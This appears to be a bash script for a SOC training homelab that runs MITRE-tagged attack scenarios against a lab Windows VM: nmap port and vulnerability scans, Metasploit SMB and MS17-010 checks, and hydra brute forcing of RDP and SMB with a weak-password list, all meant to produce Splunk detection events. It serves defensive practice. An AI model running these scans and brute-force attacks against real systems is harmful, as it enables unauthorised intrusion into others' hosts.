#!/usr/bin/env bash
# kali_attack_scenarios.sh
# Run from Kali Linux (Attacker VM) against the Windows 10 Victim.
# ONLY run this in your isolated homelab. Never against systems you don't own.
#
# Usage:
#   chmod +x kali_attack_scenarios.sh
#   ./kali_attack_scenarios.sh
#   Or run individual scenarios by calling the functions directly.

TARGET="192.168.100.20"      # Windows 10 Victim IP
SPLUNK="192.168.100.30"      # Splunk Server IP (for reference)
OUTPUT_DIR="$HOME/lab_results"

# ─────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

mkdir -p "$OUTPUT_DIR"

banner() {
    echo -e "\n${CYAN}══════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}══════════════════════════════════════════${NC}\n"
}

# ─────────────────────────────────────────────
# SCENARIO 1: Network Reconnaissance (Port Scan)
# MITRE: T1046 — Network Service Discovery
# ─────────────────────────────────────────────
scenario_portscan() {
    banner "SCENARIO 1: Port Scan (T1046)"
    echo -e "${YELLOW}[*] Running quick port scan...${NC}"
    nmap -sV --open -p 22,80,135,139,443,445,3389,5985,8080 \
        "$TARGET" -oN "$OUTPUT_DIR/portscan_quick.txt"

    echo -e "${YELLOW}[*] Running full TCP scan (slower)...${NC}"
    nmap -sV -sC -p- --min-rate 1000 "$TARGET" \
        -oN "$OUTPUT_DIR/portscan_full.txt" 2>/dev/null

    echo -e "${GREEN}[+] Results saved to $OUTPUT_DIR/portscan_*.txt${NC}"
}

# ─────────────────────────────────────────────
# SCENARIO 2: SMB Enumeration
# MITRE: T1021.002 — Remote Services: SMB
# ─────────────────────────────────────────────
scenario_smb_enum() {
    banner "SCENARIO 2: SMB Enumeration (T1021.002)"
    echo -e "${YELLOW}[*] Checking SMB version and shares...${NC}"
    nmap --script smb-os-discovery,smb-enum-shares,smb-security-mode \
        -p 445 "$TARGET" -oN "$OUTPUT_DIR/smb_enum.txt"

    echo -e "${YELLOW}[*] Running Metasploit SMB scanner...${NC}"
    msfconsole -q -x "
        use auxiliary/scanner/smb/smb_version;
        set RHOSTS $TARGET;
        run;
        use auxiliary/scanner/smb/smb_ms17_010;
        set RHOSTS $TARGET;
        run;
        exit
    " | tee "$OUTPUT_DIR/msf_smb_scan.txt"

    echo -e "${GREEN}[+] SMB enumeration complete.${NC}"
}

# ─────────────────────────────────────────────
# SCENARIO 3: Brute Force RDP
# MITRE: T1110.001 — Brute Force: Password Guessing
# ─────────────────────────────────────────────
scenario_brute_rdp() {
    banner "SCENARIO 3: RDP Brute Force (T1110.001)"

    # Create a small test wordlist
    WORDLIST="$OUTPUT_DIR/test_wordlist.txt"
    cat > "$WORDLIST" << 'EOF'
password
Password1
admin
Admin123
Welcome1
lab123
P@ssw0rd
letmein
qwerty
123456
EOF

    echo -e "${YELLOW}[*] Brute-forcing RDP (port 3389) — this generates Event ID 4625 in Splunk...${NC}"
    hydra -l Administrator -P "$WORDLIST" \
        rdp://"$TARGET" -t 4 -V \
        -o "$OUTPUT_DIR/hydra_rdp_results.txt" 2>&1

    echo -e "${GREEN}[+] RDP brute force complete. Check Splunk for EventCode=4625${NC}"
}

# ─────────────────────────────────────────────
# SCENARIO 4: Brute Force SMB
# MITRE: T1110.001
# ─────────────────────────────────────────────
scenario_brute_smb() {
    banner "SCENARIO 4: SMB Brute Force (T1110.001)"

    WORDLIST="$OUTPUT_DIR/test_wordlist.txt"
    if [ ! -f "$WORDLIST" ]; then
        echo "password\nadmin\nPassword1\nWelcome1" > "$WORDLIST"
    fi

    echo -e "${YELLOW}[*] Brute-forcing SMB...${NC}"
    hydra -l Administrator -P "$WORDLIST" \
        smb://"$TARGET" -t 2 -V \
        -o "$OUTPUT_DIR/hydra_smb_results.txt" 2>&1

    echo -e "${GREEN}[+] SMB brute force complete.${NC}"
}

# ─────────────────────────────────────────────
# SCENARIO 5: Vulnerability Scan
# MITRE: T1595.002 — Active Scanning: Vulnerability Scanning
# ─────────────────────────────────────────────
scenario_vuln_scan() {
    banner "SCENARIO 5: Vulnerability Scan (T1595.002)"
    echo -e "${YELLOW}[*] Running nmap vuln scripts...${NC}"
    nmap --script vuln -p 445,3389,135,139 "$TARGET" \
        -oN "$OUTPUT_DIR/vuln_scan.txt" 2>/dev/null

    echo -e "${GREEN}[+] Vuln scan complete. Results: $OUTPUT_DIR/vuln_scan.txt${NC}"
}

# ─────────────────────────────────────────────
# SCENARIO 6: Simulate DNS Reconnaissance
# MITRE: T1018 — Remote System Discovery
# ─────────────────────────────────────────────
scenario_network_discovery() {
    banner "SCENARIO 6: Network Discovery (T1018)"
    echo -e "${YELLOW}[*] Discovering live hosts on subnet...${NC}"
    nmap -sn 192.168.100.0/24 -oN "$OUTPUT_DIR/host_discovery.txt"

    echo -e "${YELLOW}[*] ARP scan...${NC}"
    arp-scan --localnet 2>/dev/null | tee "$OUTPUT_DIR/arp_scan.txt" || \
        echo "arp-scan not installed — run: sudo apt install arp-scan"

    echo -e "${GREEN}[+] Network discovery complete.${NC}"
}

# ─────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────
main_menu() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║     SOC Homelab Attack Scenarios         ║"
    echo "║     Target: $TARGET                 ║"
    echo "╠══════════════════════════════════════════╣"
    echo "║  1) Port Scan            (T1046)         ║"
    echo "║  2) SMB Enumeration      (T1021.002)     ║"
    echo "║  3) RDP Brute Force      (T1110.001)     ║"
    echo "║  4) SMB Brute Force      (T1110.001)     ║"
    echo "║  5) Vulnerability Scan   (T1595.002)     ║"
    echo "║  6) Network Discovery    (T1018)         ║"
    echo "║  A) Run ALL scenarios                    ║"
    echo "║  Q) Quit                                 ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"

    read -rp "Select scenario [1-6, A, Q]: " choice

    case "$choice" in
        1) scenario_portscan ;;
        2) scenario_smb_enum ;;
        3) scenario_brute_rdp ;;
        4) scenario_brute_smb ;;
        5) scenario_vuln_scan ;;
        6) scenario_network_discovery ;;
        [Aa])
            echo -e "${YELLOW}[*] Running all scenarios...${NC}"
            scenario_portscan
            scenario_smb_enum
            scenario_brute_rdp
            scenario_brute_smb
            scenario_vuln_scan
            scenario_network_discovery
            echo -e "\n${GREEN}[+] All scenarios complete! Results in: $OUTPUT_DIR${NC}"
            ;;
        [Qq]) echo "Bye."; exit 0 ;;
        *) echo -e "${RED}Invalid choice.${NC}"; main_menu ;;
    esac
}

# Check we're not accidentally running on a non-lab IP
if [[ "$TARGET" == "192.168.100.20" ]]; then
    echo -e "${YELLOW}[!] Target is $TARGET — make sure this is your lab VM.${NC}"
fi

main_menu
